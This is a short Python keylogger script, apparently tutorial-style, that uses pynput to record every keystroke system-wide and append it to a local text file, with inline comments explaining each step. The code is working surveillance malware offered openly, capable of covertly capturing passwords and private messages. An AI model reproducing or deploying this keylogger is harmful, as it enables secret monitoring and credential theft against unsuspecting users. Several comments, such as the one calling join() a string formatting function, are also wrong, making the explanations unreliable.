from pynput.keyboard import Listener
#first we will import the listner to listen to the keys of the keyboard

def writedata(data):
    char=str(data)
    char = char.replace("'","")
    #replace is the string formatting function to replace the character
    if char=="Key.enter":#key for the enter
        char="\n"
    if char=="Key.tab":#key for the tab
        char=""
    if char=="Key.backspace":
        char=""
    if char=="Key.cmd":#start Key
        char=""
    if char=="Key.left" or char=="Key.right" or char=="Key.up" or char=="Key.down":
        char=""
    if char=="Key.alt_l" or char=="Key.alt_r" or char=="Key.shift_r":
        char=""
    if char=="Key.ctrl_l" or char=="Key.ctrl_r" or char=="Key.shift":
        char=""
    if char=="Key.space":#key for the space
        char=" "
    for i in range(1,13):#Key for the F1 to F-12
        if char==str("Key.f"+str(i)):
            char=""
    with open("KeyLogFile.txt","a") as file:#using 'with' don't needs the close function as it is closed automatically
        file.write(char)#the data is being written to the file

with Listener(on_press=writedata) as listen:#we have used the 'with' to close the file automatically
    #'on_press' is the way to take any action if the particular key is pressed and the function 'write data' will be called
    #and the while statement is name under the name as 'listen'
    listen.join()#join is the string formatting function to join the strings
